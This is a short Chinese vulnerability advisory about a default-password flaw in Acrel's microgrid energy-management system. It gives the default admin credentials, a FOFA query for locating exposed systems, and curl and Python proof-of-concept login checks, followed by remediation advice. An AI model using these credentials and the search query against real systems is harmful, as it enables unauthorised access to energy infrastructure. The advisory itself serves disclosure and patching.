---
title: 【漏洞预警】安科瑞能效管理系统 默认密码漏洞
---

## 漏洞概述
安科瑞企业微电网能效管理系统存在默认密码漏洞，攻击者可通过默认账号密码 admin:Acrel001 登录后台，获取系统权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 安科瑞企业微电网能效管理系统 默认密码漏洞 |
| 漏洞类型 | 默认口令 |
| 影响组件 | 管理后台 |
| 严重程度 | 高危 |

## FOFA查询
```
icon_hash="-1291691164"
```

## POC
```bash
curl -X POST "http://target/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Acrel001"}'
```

或

```python
import requests

url = "http://target/login"
data = {"username": "admin", "password": "Acrel001"}
r = requests.post(url, json=data)
if "success" in r.text.lower() or r.status_code == 200:
    print("[+] 存在默认密码 admin:Acrel001")
```

## 修复建议
1. 修改默认口令
2. 强制用户首次登录修改密码
3. 实施账户锁定策略